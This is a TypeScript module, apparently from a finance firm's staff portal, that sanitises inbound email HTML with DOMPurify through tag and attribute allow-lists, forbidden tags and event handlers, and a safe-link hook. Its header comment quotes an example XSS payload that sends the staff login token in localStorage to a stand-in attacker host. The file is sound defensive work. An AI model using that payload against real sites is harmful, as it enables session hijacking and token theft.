// BF_PORTAL_HTML_SANITIZE_v1
// The portal renders INBOUND email HTML - content written by whoever emailed
// info@boreal.financial. It was passed straight to dangerouslySetInnerHTML with no
// sanitiser anywhere in the codebase, while the staff JWT sits in localStorage. So
// anyone could email staff a payload like
//   <img src=x onerror="fetch('https://evil/?t='+localStorage.auth_token)">
// and take over a staff session the moment the mail was opened. Every path that puts
// untrusted HTML into the DOM must go through here.
import DOMPurify from "dompurify";

const CONFIG: Parameters<typeof DOMPurify.sanitize>[1] = {
  // Email markup only. No script, no iframe, no object/embed, no forms.
  ALLOWED_TAGS: [
    "a", "b", "blockquote", "br", "caption", "code", "col", "colgroup", "dd", "div",
    "dl", "dt", "em", "figcaption", "figure", "h1", "h2", "h3", "h4", "h5", "h6", "hr",
    "i", "img", "li", "ol", "p", "pre", "s", "small", "span", "strong", "sub", "sup",
    "table", "tbody", "td", "tfoot", "th", "thead", "tr", "u", "ul",
  ],
  ALLOWED_ATTR: [
    "href", "src", "alt", "title", "width", "height", "align", "colspan", "rowspan",
    "style", "class", "cid", "target", "rel",
  ],
  // Block javascript:, vbscript:, and similar schemes.
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel|cid):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  FORBID_TAGS: ["script", "style", "iframe", "object", "embed", "form", "input", "link", "meta", "base"],
  FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover", "formaction", "srcdoc"],
  ALLOW_DATA_ATTR: false,
};

// Force every surviving link to open safely and never leak the referrer.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer nofollow");
  }
});

export function sanitizeHtml(dirty: string | null | undefined): string {
  if (!dirty) return "";
  return DOMPurify.sanitize(String(dirty), CONFIG) as unknown as string;
}
